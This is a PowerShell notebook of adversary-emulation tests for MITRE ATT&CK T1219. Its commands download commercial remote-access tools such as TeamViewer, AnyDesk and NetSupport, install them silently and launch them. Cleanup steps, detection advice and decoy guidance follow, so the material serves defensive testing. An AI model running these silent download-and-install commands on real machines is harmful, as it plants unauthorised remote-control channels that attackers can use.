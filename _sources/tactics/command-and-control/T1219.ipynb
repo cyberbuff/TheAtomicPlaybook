{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "830bf366",
   "metadata": {},
   "source": "# T1219 - Remote Access Software\nAn adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.(Citation: Symantec Living off the Land)\n\nRemote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)).\n\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.(Citation: CrowdStrike 2015 Global Threat Report)(Citation: CrySyS Blog TeamSpy)"
  },
  {
   "cell_type": "markdown",
   "id": "b9a68ad4",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "6ce4a808",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - TeamViewer Files Detected Test on Windows",
    "An adversary may attempt to trick the user into downloading teamviewer and using this to maintain access to the machine. Download of TeamViewer installer will be at the destination location when sucessfully executed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ebbfc51",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "07af9732",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$file = 'C:\\Program Files (x86)\\TeamViewer\\uninstall.exe'\nif(Test-Path $file){ Start-Process $file \"/S\" -ErrorAction Ignore | Out-Null }\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nRemove-Item $file1 -ErrorAction Ignore | Out-Null```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e57056d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "11cce9b5",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - AnyDesk Files Detected Test on Windows",
    "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5c79733b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "1ca096ef",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe.exe\"\nRemove-Item $file1 -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90b0b072",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8c131f62",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - LogMeIn Files Detected Test on Windows",
    "An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nStart-Process -Wait $file1 /quiet;\nStart-Process 'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe' \"/S\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7e4fe3d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "5a7d3b42",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nget-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45567aed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "be9dd9e6",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - GoToAssist Files Detected Test on Windows",
    "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe \"https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1\"\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Downloads\\GoToAssist.exe\"\nStart-Process $file1 /S;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63c6cffc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "e19c7f06",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\ntry{$PathToAtomicsFolder/T1219/Bin/GoToCleanup.ps1} catch{}```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0193821d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b3d0e402",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - ScreenConnect Application Download and Install on Windows",
    "An adversary may attempt to trick the user into downloading ScreenConnect for use as a C2 channel. Download of ScreenConnect installer will be in the Downloads directory.\nMsiexec will be used to quietly insall ScreenConnect.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nInvoke-WebRequest -OutFile $installer \"https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi\"\nmsiexec /i $installer /qn\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0c1b60b0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "0fb2e47b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$installer = \"C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\"\nmsiexec /x $installer /qn\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c882f2d3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ab660afc",
   "metadata": {},
   "source": "### Atomic Test #6 - Ammyy Admin Software Execution\nAn adversary may attempt to trick the user into downloading Ammyy Admin Remote Desktop Software for use as a C2 channel. \nUpon successful execution, Ammyy Admin will be executed. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Ammyy Admin must exist on disk at the specified location (#{Ammyy_Admin_Path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\ammyy.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://web.archive.org/web/20140625232737/http://www.ammyy.com/AA_v3.exe\" -OutFile \"$env:temp\\ammyy.exe\" -UseBasicParsing\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85cf2339",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8de6c698",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process $env:temp\\ammyy.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e2df2ba3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "4faa6349",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"Ammyy\" -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f7a6ebd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "4cce1cc7",
   "metadata": {},
   "source": "### Atomic Test #7 - RemotePC Software Execution\nAn adversary may attempt to trick the user into downloading RemotePC Software for use as a C2 channel. \nUpon successful execution, RemotePC will be executed. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: RemotePC must exist on disk at the specified location (#{RemotePC_Path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\RemotePC.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://static.remotepc.com/downloads/rpc/140422/RemotePC.exe\" -OutFile \"$env:temp\\RemotePC.exe\" -UseBasicParsing\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5b62a422",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "77225dce",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process $env:temp\\RemotePC.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f790789",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "ff3bcec6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "05284fb8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "bac5bc0d",
   "metadata": {},
   "source": "### Atomic Test #8 - NetSupport - RAT Execution\nA recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as NetSupport to provide the operator with access to the network using legitimate services. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: NetSupport must be downloaded and exist on the disk at the specified location. (#{NetSupport_Path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\T1219_NetSupport.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n(New-Object Net.WebClient).DownloadFile(\"https://nsproducts.azureedge.net/nsm-1270/en/Setup.exe\",\"$env:temp\\T1219_NetSupport.exe\")\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "79a409cf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "83291134",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process $env:temp\\T1219_NetSupport.exe -ArgumentList \"/S /v/qn\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "10f2cd7e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "ddd45864",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"client32\" -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95dd1d37",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ce8c7d1f",
   "metadata": {},
   "source": "### Atomic Test #9 - UltraViewer - RAT Execution\nA recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Ultraviewer installer must be downloaded and exist on the disk at the specified location. (#{UltraViewer_Path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:temp\\T1219_UltraViewer.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n(New-Object Net.WebClient).DownloadFile(\"https://www.ultraviewer.net/en/UltraViewer_setup_6.5_en.exe\",\"$env:temp\\T1219_UltraViewer.exe\")\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f828d85f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1ea1bb83",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process -Wait -FilePath \"$env:temp\\T1219_UltraViewer.exe\" -Argument \"/silent\" -PassThru\nStart-Process 'C:\\Program Files (x86)\\UltraViewer\\UltraViewer_Desktop.exe'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27603174",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "b5598bbe",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"UltraViewer_Desktop\" -Force -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2737f8c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "94a51759",
   "metadata": {},
   "source": "### Atomic Test #10 - UltraVNC Execution\nAn adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: UltraVNC must exist at (#{UltraVNC_Viewer_Path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe') {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nStart-BitsTransfer -Source \"https://www.uvnc.eu/download/1381/UltraVNC_1_3_81_X64_Setup.exe\" -Destination $env:temp\\vncsetup.exe -dynamic\nstart-process $env:temp\\vncsetup.exe /silent\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c2b34f1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "e60385a0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nStart-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1077d72e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "dadd3af6",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"vncviewer\" -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0204c56",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1219 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a2951ab4",
   "metadata": {},
   "source": "## Detection\nMonitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\n\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions."
  },
  {
   "cell_type": "markdown",
   "id": "a5e6eaeb",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy System \n Configure a computing system to serve as an attack target or experimental environment.   \n\n A decoy system is a computing resource presented to the adversary in support of active defense.  The underlying system can be real, virtual, or simulated, and can be presented as one of a variety of IT devices including user workstations, servers, networking systems, IOT (embedded devices), mobile systems like phones, etc.\n#### Opportunity\nThere is an opportunity to study the adversary and collect first-hand observations about them and their tools.\n#### Use Case\nA defender can install remote access tools on decoy systems across the network to see if the adversary uses these tools for command and control.\n#### Procedures\nUse an isolated system to visit a suspected compromised website.  Collect any associated scripting code or files dropped onto the system.\nSetup a server which appears to be something that is commonly expected within a network, such as web server.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}